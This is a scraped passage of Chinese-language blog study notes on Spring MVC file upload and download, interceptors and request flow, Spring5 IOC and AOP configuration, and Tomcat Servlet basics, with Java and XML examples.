7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // 实际使用的时候，将需要下载的路径作为参数传递即可 @RequestMapping(\u0026#34;/testDown\u0026#34;) public ResponseEntity\u0026lt;byte[]\u0026gt; testResponseEntity(HttpSession session) throws IOException { //获取ServletContext对象 ServletContext servletContext = session.getServletContext(); //获取服务器中文件的真实路径 String realPath = servletContext.getRealPath(\u0026#34;/static/img/1.jpg\u0026#34;); //创建输入流 InputStream is = new FileInputStream(realPath); //创建字节数组 byte[] bytes = new byte[is.available()]; //将流读到字节数组中 is.read(bytes); //创建HttpHeaders对象设置响应头信息 MultiValueMap\u0026lt;String, String\u0026gt; headers = new HttpHeaders(); //设置要下载方式以及下载文件的名字 headers.add(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment;filename=1.jpg\u0026#34;); //设置响应状态码 HttpStatus statusCode = HttpStatus.OK; //创建ResponseEntity对象 ResponseEntity\u0026lt;byte[]\u0026gt; responseEntity = new ResponseEntity\u0026lt;\u0026gt;(bytes, headers, statusCode); //关闭输入流 is.close(); return responseEntity; } 文件上传\n文件上传要求form表单的请求方式必须为post，并且添加属性enctype=\u0026quot;multipart/form-data\u0026quot;\nSpringMVC中将上传的文件封装到MultipartFile对象中，通过此对象可以获取文件相关信息\n步骤\n添加依赖\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在SpringMVC.xml里面注册组件\n1 2 \u0026lt;!--必须通过文件解析器的解析才能将文件转换为MultipartFile对象--\u0026gt; \u0026lt;bean id=\u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 实际方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @RequestMapping(\u0026#34;/testUp\u0026#34;) public String testUp(MultipartFile photo, HttpSession session) throws IOException { //获取上传的文件的文件名 String fileName = photo.getOriginalFilename(); //处理文件重名问题 String hzName = fileName.substring(fileName.lastIndexOf(\u0026#34;.\u0026#34;)); fileName = UUID.randomUUID().toString() + hzName; //获取服务器中photo目录的路径 ServletContext servletContext = session.getServletContext(); String photoPath = servletContext.getRealPath(\u0026#34;photo\u0026#34;); File file = new File(photoPath); if(!file.exists()){ file.mkdir(); } String finalPath = photoPath + File.separator + fileName; //实现上传功能 photo.transferTo(new File(finalPath)); return \u0026#34;success\u0026#34;; } 8 拦截器 SpringMVC中的拦截器有三个抽象方法： preHandle：控制器方法执行之前执行preHandle()，其boolean类型的返回值表示是否拦截或放行，返回true为放行，即调用控制器方法；返回false表示拦截，即不调用控制器方法 postHandle：控制器方法执行之后执行postHandle() afterComplation：处理完视图和模型数据，渲染视图完毕之后执行afterComplation() 多个拦截器一起工作的时候 preHandle之前的顺序按照SpringMVC.xml里面组件注册的先后顺序执行，并相当于以栈的形式压入。 后面的按照出栈的形式执行。 如果一个拦截器的preHandle返回false，则其之后的拦截器的都不会执行，postHandle()都不执行，返回false的拦截器之前的拦截器的afterComplation()会执行 9 异常处理 SpringMVC提供了自定义的异常处理器SimpleMappingExceptionResolver，使用方式：\n基于注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 //@ControllerAdvice将当前类标识为异常处理的组件 @ControllerAdvice public class ExceptionController { //@ExceptionHandler用于设置所标识方法处理的异常 @ExceptionHandler(ArithmeticException.class) //ex表示当前请求处理中出现的异常对象 public String handleArithmeticException(Exception ex, Model model){ model.addAttribute(\u0026#34;ex\u0026#34;, ex); return \u0026#34;error\u0026#34;; } } 10 SpringMVC执行流程 用户向服务器发送请求，请求被SpringMVC 前端控制器 DispatcherServlet捕获。\nDispatcherServlet对请求URL进行解析，得到请求资源标识符（URI），判断请求URI对应的映射：\na) 不存在\ni. 再判断是否配置了mvc:default-servlet-handler ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误 iii. 如果有配置，则访问目标资源（一般为静态资源，如：JS,CSS,HTML)，找不到客户端也会展示404错误 b) 存在则执行下面的流程\n根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及Handler对象对应的拦截器），最后以HandlerExecutionChain执行链对象的形式返回。\nDispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。\n如果成功获得HandlerAdapter，此时将开始执行拦截器的preHandler(…)方法【正向】\n提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller)方法，处理请求。在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作：\na) HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定的响应信息 b) 数据转换：对请求消息进行数据转换。如String转换成Integer、Double等 c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等 d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中 Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象。\n此时将开始执行拦截器的postHandle(\u0026hellip;)方法【逆向】。\n根据返回的ModelAndView（此时会判断是否存在异常：如果存在异常，则执行HandlerExceptionResolver进行异常处理）选择一个适合的ViewResolver进行视图解析，根据Model和View，来渲染视图。\n渲染视图完毕执行拦截器的afterCompletion(…)方法【逆向】。\n将渲染结果返回给客户端。\n","permalink":"http://www.reus09.top/posts/tech/spring-mvc/","summary":"Spring-mvc 本篇主要对spring-mvc的知识点进行总结 MVC的工作流程： 用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，","title":"Spring Mvc"},{"content":"Spring5 框架 这里主要学习了Spring5的相关知识，对ioc和Aop的相关知识进行整理 0x01 IOC 概念 控制反转，把创建对象过程交给 Spring 进行管理 使用目的： 为了耦合度降低 底层原理 xml 解析、工厂模式、反射 IOC 思想基于 IOC 容器完成，IOC 容器底层就是对象工厂 1.1 实现方式 BeanFactory：IOC 容器基本实现，是 Spring 内部的使用接口，不提供开发人员进行使用 加载配置文件时候不会创建对象，在获取对象（使用）才去创建对象 ApplicationContext：BeanFactory 接口的子接口，提供更多更强大的功能，一般由开发人 员进行使用 加载配置文件时候就会把在配置文件对象进行创建 Bean管理 Spring创建对象 Spring注入属性 实现方法 基于xml配置文件方式实现 基于注解方式实现 1.2 xml配置文件 1.2.1 创建对象 在 spring 配置文件中，使用 bean 标签，标签里面添加对应属性，就可以实现对象创建 在 bean 标签有很多属性，介绍常用的属性 * id 属性:唯一标识 class 属性:类全路径（包类路径) 创建对象时候，默认也是执行无参数构造方法完成对象创建 1 \u0026lt;bean id=\u0026#34;user\u0026#34; class=\u0026#34;com.atguigu.spring5.User\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2 注入属性 DI：依赖注入，就是注入属性 1.2.2.1 set方法注入 这个注入方法类中必须要有set方法，使用property属性\n1 2 3 4 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34;\u0026gt; \u0026lt;!--使用 property 完成属性注入 name：类里面属性名称 value：向属性注入的值 --\u0026gt; \u0026lt;property name=\u0026#34;bname\u0026#34; value=\u0026#34;易筋经\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; 这个在book中对于类中的元素必须实现了setBname方法\n1 2 public void setBname(String bname) { this.bname = bname; } 1.2.2.2 有参数构造注入 这个注入方式，构造类中必须有对应的构造方法。构造方法含有几个参数便在bean中添加几个元素，使用constructor-arg属性进行配置\n1 2 3 4 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.Orders\u0026#34;\u0026gt; \u0026lt;constructor-arg name=\u0026#34;oname\u0026#34; value=\u0026#34;电脑\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;constructor-arg name=\u0026#34;address\u0026#34; value=\u0026#34;China\u0026#34;\u0026gt;\u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; 对应的构造方法为\n1 2 3 4 5 public Orders(String oname,String address) { this.oname = oname; this.address = address; } 1.2.2.3 p名称空间注入 需要在bean中导入http://www.springframework.org/schema/p中的工具进行约束\n这里以使用set方法的注入为例\n1 \u0026lt;bean id=\u0026#34;book\u0026#34; class=\u0026#34;com.atguigu.spring5.Book\u0026#34; p:bname=\u0026#34;九阳神功\u0026#34; p:bauthor=\u0026#34;无名氏\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.2.4 其他类型属性注入 字面量\nnull值，用\u0026lt;null/\u0026gt;来修饰即可\n属性包含特殊值，比如\u0026lt;或\u0026gt;\n法一：借助\u0026amp;lt，\u0026amp;gt等转义符\n法二：使用CDATA\n1 2 3 \u0026lt;property name=\u0026#34;address\u0026#34;\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;\u0026lt;南京\u0026gt;\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; 注入外部属性\n在一个类中，另一个类注入到这个类中，可以先创建两个对应的对象后，使用ref属性，将类注入到需要注入的类中\n外部bean\n1 2 3 4 5 6 7 \u0026lt;!--1 service 和 dao 对象创建--\u0026gt; \u0026lt;bean id=\u0026#34;userService\u0026#34; class=\u0026#34;com.atguigu.spring5.service.UserService\u0026#34;\u0026gt; \u0026lt;!--注入 userDao 对象 name 属性：类里面属性名称 ref 属性：创建 userDao 对象 bean 标签 id 值 --\u0026gt; \u0026lt;property name=\u0026#34;userDao\u0026#34; ref=\u0026#34;userDaoImpl\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;bean id=\u0026#34;userDaoImpl\u0026#34; class=\u0026#34;com.atguigu.spring5.dao.UserDaoImpl\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 内部bean的操作就不在赘述，与上述类似\n级联赋值\n即被注入的类中也需要元素进行注入 可以直接ref 也可以在ref后，利用class.ss制定对应的类中元素进行赋值(这里的ss借指对应的类中元素) 注入集合类型\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;!--1 集合类型属性注入--\u0026gt; \u0026lt;bean id=\u0026#34;stu\u0026#34; class=\u0026#34;com.atguigu.spring5.collectiontype.Stu\u0026#34;\u0026gt; \u0026lt;!--数组类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;courses\u0026#34;\u0026gt; \u0026lt;array\u0026gt; \u0026lt;value\u0026gt;java 课程\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;数据库课程\u0026lt;/value\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--list 类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;list\u0026#34;\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;张三\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;小三\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--map 类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;maps\u0026#34;\u0026gt; \u0026lt;map\u0026gt; \u0026lt;entry key=\u0026#34;JAVA\u0026#34; value=\u0026#34;java\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;entry key=\u0026#34;PHP\u0026#34; value=\u0026#34;php\u0026#34;\u0026gt;\u0026lt;/entry\u0026gt; \u0026lt;/map\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!--set 类型属性注入--\u0026gt; \u0026lt;property name=\u0026#34;sets\u0026#34;\u0026gt; \u0026lt;set\u0026gt; \u0026lt;value\u0026gt;MySQL\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;Redis\u0026lt;/value\u0026gt; \u0026lt;/set\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; array引入array标签,list引入list，map引入map和entry，set引入set标签 1.2.3 FactoryBean Spring 有两种类型 bean，\n一种普通 bean 在配置文件中定义 bean 类型就是返回类型 另外一种工厂 bean（FactoryBean) 在配置文件定义 bean 类型可以和返回类型不一样 实现方法\n创建类，让这个类作为工厂 bean，实现接口 FactoryBean 实现接口里面的方法，在实现的方法中定义返回的 bean 类型 借用FactoryBean接口来实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 public interface FactoryBean\u0026lt;T\u0026gt; { String OBJECT_TYPE_ATTRIBUTE = \u0026#34;factoryBeanObjectType\u0026#34;; @Nullable T getObject() throws Exception; @Nullable Class\u0026lt;?\u0026gt; getObjectType(); default boolean isSingleton() { return true; } } 1.2.4 Bean作用域 在 Spring 里面，默认情况下，bean 是单实例对象 在 spring 配置文件 bean 标签里面有属性（scope）用于设置单实例还是多实例 scope 属性值 第一个值 默认值，singleton，表示是单实例对象 第二个值 prototype，表示是多实例对象 1.2.5 生命周期 （1）通过构造器创建 bean 实例（无参数构造）\n（2）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法）\n（3）调用 bean 的初始化的方法（需要进行配置初始化的方法）\n（4）bean 可以使用了（对象获取到了）\n（5）当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法）\n这里以代码为例\n1 2 3 \u0026lt;bean id=\u0026#34;orders\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.Orders\u0026#34; init-method=\u0026#34;initMethod\u0026#34; destroy-method=\u0026#34;destroyMethod\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;oname\u0026#34; value=\u0026#34;手机\u0026#34;\u0026gt;\u0026lt;/property\u0026gt; \u0026lt;/bean\u0026gt; 利用init-method，destory-method两个属性执行初始化方法和销毁方法 加上后置处理器，bean生命周期共有七步\n（1）通过构造器创建 bean 实例（无参数构造） （2）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法） （3）把 bean 实例传递 bean 后置处理器的方法 postProcessBeforeInitialization （4）调用 bean 的初始化的方法（需要进行配置初始化的方法） （5）把 bean 实例传递 bean 后置处理器的方法 postProcessAfterInitialization （6）bean 可以使用了（对象获取到了） （7）当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class MyBeanPost implements BeanPostProcessor { @Override public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;在初始化之前执行的方法\u0026#34;); return bean; } @Override public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { System.out.println(\u0026#34;在初始化之后执行的方法\u0026#34;); return bean; } } xml配置,全局开启后置处理器\n1 \u0026lt;bean id=\u0026#34;myBeanPost\u0026#34; class=\u0026#34;com.atguigu.spring5.bean.MyBeanPost\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; 1.2.6 自动装配 bean 标签属性 autowire，配置自动装配 autowire 属性常用两个值： byName 根据属性名称注入 ,注入值 bean 的 id 值和类属性名称一样 byType 根据属性类型注入 1.3 基于注解方式 （1）注解是代码特殊标记，格式：@注解名称(属性名称=属性值, 属性名称=属性值..)\n（2）使用注解，注解作用在类上面，方法上面，属性上面\n（3）使用注解目的：简化 xml 配置\nSpring 针对 Bean 管理中创建对象提供注解\n@Component:常用于正常的组件 @Service :常用于service层 @Controller ：常用于controller层 @Repository : 常用于dao层 上面四个注解功能是一样的，都可以用来创建 bean 实例，只是作用的层次不一样 使用注解需要开启注解扫描\nxml\n1 \u0026lt;context:component-scan base-package=\u0026#34;com.atguigu\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; 纯代码,需要创建配置类\n1 2 3 @Configuration //作为配置类，替代 xml 配置文件 @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) public class SpringConfig { } 基于注解方式实现属性注入\n@Autowired：根据属性类型进行自动装配\n首先按照类型去容器中找对应的组件，如果找到一个就赋值，找不到就抛异常； 如果有多个类型匹配时，会使用要注入的对象变量名称作为bean的id，在spring容器查找，找到了也可以注入成功，找不到就报错。 结合注解@Qualifer，指定一个id：在自动按照类型注入的基础之上，再按照指定的bean的id去查找。它在给字段注入时不能独立使用，必须和@Autowired一起使用；但是给方法参数注入时，可以独立使用。 1 2 3 4 5 6 7 8 9 10 11 @Service public class UserService { //定义 dao 类型属性 //不需要添加 set 方法 //添加注入属性注解 @Autowired private UserDao userDao; public void add() { System.out.println(\u0026#34;service add.......\u0026#34;); userDao.add(); } } @Qualifier：根据名称进行注入 这个@Qualifier 注解的使用，和上面@Autowired 一起使用\n1 2 3 4 5 //定义 dao 类型属性 //不需要添加 set 方法 //添加注入属性注解 @Autowired //根据类型进行注入 @Qualifier(value = \u0026#34;userDaoImpl1\u0026#34;) //根据名称进行注入 private UserDao userDao; @Resource：可以根据类型注入，可以根据名称注入\n1 2 3 4 //@Resource //根据类型进行注入 @Resource(name = \u0026#34;userDaoImpl1\u0026#34;) private UserDao userDao; @Value：注入普通类型属性\n1 2 @Value(value = \u0026#34;abc\u0026#34;) private String name; 1.4 实现IOC容器中对象的获取 xml\n1 2 3 ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\u0026#34;spring-config.xml\u0026#34;); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); 全注解\nconfig写的是实现IOC扫描的配置类 1 2 3 ApplicationContext context = new AnnotationConfigApplicationContext(Config.class); Object obj = context.getBean(\u0026#34;obj\u0026#34;, Object.class); 0x02 Aop 概念 面向切面，不修改源代码进行功能增强 面向切面编程（方面），利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得 业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。 底层原理 AOP 底层使用动态代理 2.1 动态代理 使用方法newProxyInstance\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Object newProxyInstance(ClassLoader loader, Class\u0026lt;?\u0026gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException Returns an instance of a proxy class for the specified interfaces that dispatches method invocations to the specified invocation handler. Proxy.newProxyInstance throws IllegalArgumentException for the same reasons that Proxy.getProxyClass does. Parameters: loader - the class loader to define the proxy class interfaces - the list of interfaces for the proxy class to implement h - the invocation handler to dispatch method invocations to Returns: a proxy instance with the specified invocation handler of a proxy class that is defined by the specified class loader and that implements the specified interfaces 方法有三个参数：\n第一参数，类加载器 第二参数，增强方法所在的类，这个类实现的接口，支持多个接口 第三参数，实现这个接口 InvocationHandler，创建代理对象，写增强的部分 处理的增强结果是借用InvocationHandler接口的invoke方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class UserDaoProxy implements InvocationHandler{ private Object obj; public UserDaoProxy(Object obj) { this.obj = obj; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\u0026#34;发放之前执行....\u0026#34;+method.getName()+\u0026#34;参数：\u0026#34;+ Arrays.toString(args)); Object res = method.invoke(obj,args); System.out.println(\u0026#34;方法之后执行\u0026#34;); return res; } } 2.2 Aop术语 连接点\n类里面哪些方法可以被增强，属于连接点 切入点\n实际被增强的方法，成为切入点\n表达式\n1 2 3 4 5 6 7 8 9 10 11 execution([权限修饰符] [返回类型] [类全路径] [方法名称]([参数列表]) ) 举例 1：对 com.atguigu.dao.BookDao 类里面的 add 进行增强 execution(* com.atguigu.dao.BookDao.add(..)) 举例 2：对 com.atguigu.dao.BookDao 类里面的所有的方法进行增强 execution(* com.atguigu.dao.BookDao.* (..)) 举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强 execution(* com.atguigu.dao.*.* (..)) 相同的切入点可以使用@Pointcut进行注册同一个路径\n1 2 3 4 5 6 7 8 @Pointcut(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void pointdemo() { } //前置通知 //@Before 注解表示作为前置通知 @Before(value = \u0026#34;pointdemo()\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } 通知（增强）\n实际增强的逻辑部分 通知的类型 前置通知:Before 后置通知:AfterReturning 环绕通知:Around 异常通知:AfterThrowing 最终通知:After 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Component @Aspect //生成代理对象 public class UserProxy { //前置通知 //@Before 注解表示作为前置通知 @Before(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void before() { System.out.println(\u0026#34;before.........\u0026#34;); } //后置通知（返回通知） @AfterReturning(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterReturning() { System.out.println(\u0026#34;afterReturning.........\u0026#34;); } //最终通知 @After(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void after() { System.out.println(\u0026#34;after.........\u0026#34;); } //异常通知 @AfterThrowing(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void afterThrowing() { System.out.println(\u0026#34;afterThrowing.........\u0026#34;); } //环绕通知 @Around(value = \u0026#34;execution(* com.atguigu.spring5.aopanno.User.add(..))\u0026#34;) public void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable { System.out.println(\u0026#34;环绕之前.........\u0026#34;); //被增强的方法执行 proceedingJoinPoint.proceed(); System.out.println(\u0026#34;环绕之后.........\u0026#34;); } } 切面\n动作，过程 实现增强的过程代码 实现过程\n对使用的类要进行组件注册，使用ioc注册，增强类用Aspect\n需要开启全局代理\nxml\n1 2 3 \u0026lt;!-- 开启 Aspect 生成代理对象--\u0026gt; \u0026lt;aop:aspectj-autoproxy\u0026gt;\u0026lt;/aop:aspectj-autoproxy\u0026gt; 完全注解\n1 2 3 4 @Configuration @ComponentScan(basePackages = {\u0026#34;com.atguigu\u0026#34;}) @EnableAspectJAutoProxy(proxyTargetClass = true) public class ConfigAop { } @Order可以设置优先级，数字越小优先级越高。\n","permalink":"http://www.reus09.top/posts/tech/spring/","summary":"Spring5 框架 这里主要学习了Spring5的相关知识，对ioc和Aop的相关知识进行整理 0x01 IOC 概念 控制反转，把创建对象过程交给 Spring 进行管理 使用目的： 为了","title":"Spring"},{"content":"0x01 Tomcat使用 1.1 Tomcat设置编码 Tomcat设置编码\ntomcat8之前，设置编码：\nget请求方式： get方式目前不需要设置编码（基于tomcat8）\n如果是get请求发送的中文数据，转码稍微有点麻烦（tomcat8之前）\n1 2 3 4 5 String fname = request.getParameter(\u0026#34;fname\u0026#34;); //1.将字符串打散成字节数组 byte[] bytes = fname.getBytes(\u0026#34;ISO-8859-1\u0026#34;); //2.将字节数组按照设定的编码重新组装成字符串 fname = new String(bytes,\u0026#34;UTF-8\u0026#34;); post请求方式： request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\ntomcat8开始，设置编码，只需要针对post方式 request.setCharacterEncoding(\u0026quot;UTF-8\u0026quot;);\n注意：\n需要注意的是，设置编码(post)这一句代码必须在所有的获取参数动作之前 1.2 Servlet 1.2.1 继承关系 Servlet的继承关系 - 重点查看的是服务方法（service()）\n继承关系 javax.servlet.Servlet接口 javax.servlet.GenericServlet抽象类 javax.servlet.http.HttpServlet抽象子类\n相关方法\njavax.servlet.Servlet接口:\n1 2 3 void init(config) - 初始化方法 void service(request,response) - 服务方法 void destory() - 销毁方法 javax.servlet.GenericServlet抽象类：\n1 void service(request,response) - 仍然是抽象的 javax.servlet.http.HttpServlet 抽象子类：\n1 void service(request,response) - 不是抽象的 String method = req.getMethod(); 获取请求的方式\n在HttpServlet这个抽象类中，do方法都差不多:\n1 2 3 4 5 6 7 8 9 protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String protocol = req.getProtocol(); String msg = lStrings.getString(\u0026#34;http.method_get_not_supported\u0026#34;); if (protocol.endsWith(\u0026#34;1.1\u0026#34;)) { resp.sendError(405, msg); } else { resp.sendError(400, msg); } } 小结：\n继承关系： HttpServlet -\u0026gt; GenericServlet -\u0026gt; Servlet Servlet中的核心方法： init() , service() , destroy() 服务方法： 当有请求过来时，service方法会自动响应（其实是tomcat容器调用的） 在HttpServlet中我们会去分析请求的方式：到底是get、post、head还是delete等 然后再决定调用的是哪个do开头的方法 那么在HttpServlet中这些do方法默认都是405的实现风格-要我们子类去实现对应的方法，否则默认会报405错误 因此，我们在新建Servlet时，我们才会去考虑请求方法，从而决定重写哪个do方法 1.2.2 生命周期 Servlet的生命周期\n生命周期：从出生到死亡的过程就是生命周期。对应Servlet中的三个方法：init(),service(),destroy()\n默认情况下：\n第一次接收请求时，这个Servlet会进行实例化(调用构造方法)、初始化(调用init())、然后服务(调用service()) 从第二次请求开始，每一次都是服务 当容器关闭时，其中的所有的servlet实例会被销毁，调用销毁方法 通过案例我们发现：\nServlet实例tomcat只会创建一个，所有的请求都是这个实例去响应。 默认情况下，第一次请求时，tomcat才会去实例化，初始化，然后再服务.这样的好处是提高系统的启动速度 。 这样的缺点是第一次请求时，耗时较长。 因此得出结论： 如果需要提高系统的启动速度，当前默认情况就是这样。如果需要提高响应速度，我们应该设置Servlet的初始化时机。 Servlet在容器中是：单例的、线程不安全的\n单例：所有的请求都是同一个实例去响应 线程不安全：一个线程需要根据这个实例中的某个成员变量值去做逻辑判断。但是在中间某个时机，另一个线程改变了这个成员变量的值，从而导致第一个线程的执行路径发生了变化 我们已经知道了servlet是线程不安全的，给我们的启发是： 尽量的不要在servlet中定义成员变量。如果不得不定义成员变量，那么不要去：①不要去修改成员变量的值 ②不要去根据成员变量的值做一些逻辑判断 1.2.3 session 会话\nHttp是无状态的\nHTTP 无状态 ：服务器无法判断这两次请求是同一个客户端发过来的，还是不同的客户端发过来的\n无状态带来的现实问题：对于多次请求无法确定是一个同一个用户发送，从而增加服务器负载。\n通过会话跟踪技术来解决无状态的问题。\n会话跟踪技术\n客户端第一次发请求给服务器，服务器获取session，获取不到，则创建新的，然后响应给客户端\n下次客户端给服务器发请求时，会把sessionID带给服务器，那么服务器就能获取到了，那么服务器就判断这一次请求和上次某次请求是同一个客户端，从而能够区分开客户端\n常用的API：\n1 2 3 4 5 6 7 8 9 request.getSession() -\u0026gt; 获取当前的会话，没有则创建一个新的会话 request.getSession(true) -\u0026gt; 效果和不带参数相同 request.getSession(false) -\u0026gt; 获取当前会话，没有则返回null，不会创建新的 session.getId() -\u0026gt; 获取sessionID session.isNew() -\u0026gt; 判断当前session是否是新的 session.getMaxInactiveInterval() -\u0026gt; session的非激活间隔时长，默认1800秒 session.setMaxInactiveInterval() session.invalidate() -\u0026gt; 强制性让会话立即失效 session保存作用域\nsession保存作用域是和具体的某一个session对应的\n常用的API：\n1 2 3 void session.setAttribute(k,v) Object session.getAttribute(k) void removeAttribute(k) 作用域比较：\n原始情况下，保存作用域我们可以认为有四个： page（页面级别，现在几乎不用） , request（一次请求响应范围） , session（一次会话范围） , application（整个应用程序范围） request：一次请求响应范围 session：一次会话范围有效 application： 一次应用程序范围有效 1.2.4 网页跳转 服务器内部转发以及客户端重定向 服务器内部转发 : request.getRequestDispatcher(\u0026quot;...\u0026quot;).forward(request,response); 一次请求响应的过程，对于客户端而言，内部经过了多少次转发，客户端是不知道的 地址栏没有变化 客户端重定向： response.sendRedirect(\u0026quot;....\u0026quot;); 两次请求响应的过程。客户端肯定知道请求URL有变化 地址栏有变化 1.2.5 对应网站route设置 可以在web.xml里面配置Servlet\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.reus.Demo01Servlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;hello\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;world\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;Demo01Servlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/demo01\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 可以通过注解的方式进行配置\n1 2 3 4 @WebServlet(urlPatterns = {\u0026#34;/demo01\u0026#34;} , initParams = { @WebInitParam(name=\u0026#34;hello\u0026#34;,value=\u0026#34;world\u0026#34;) }) 这用Demo01Servelet.java对应的service将对应网页的route为/demo01\n获取ServletContext，有很多方法\n在初始化方法中： ServletContxt servletContext = getServletContext()\n在服务方法中也可以通过request对象获取，也可以通过session获取： request.getServletContext(); session.getServletContext()\n获取初始化值：\nservletContext.getInitParameter(); 1.3 Thymeleaf视图技术 Thymeleaf - 视图模板技术\n添加thymeleaf的jar包 新建一个Servlet类ViewBaseServlet 在web.xml文件中添加配置 配置前缀 view-prefix 配置后缀 view-suffix 使得我们的Servlet继承ViewBaseServlet 根据逻辑视图名称 得到 物理视图名称 此处的视图名称是 index\n那么thymeleaf会将这个 逻辑视图名称 对应到 物理视图 名称上去\n逻辑视图名称 ： index\n物理视图名称 ： view-prefix + 逻辑视图名称 + view-suffix\n所以真实的视图名称是： / index .html super.processTemplate(\u0026quot;index\u0026quot;,request,response);\n使用thymeleaf的标签\n1 th:if , th:unless , th:each , th:text , th:src\t,\tth:value th:href 0x02 myssm 2.1 BaseDAO 这里见另一博客 JDBC BaseDAO抽象了基础的增删改查操作API 2.2 IOC IOC\n耦合/依赖\nIOC - 控制反转 / DI - 依赖注入\n控制反转：\n之前在Servlet中，我们创建service对象 ， FruitService 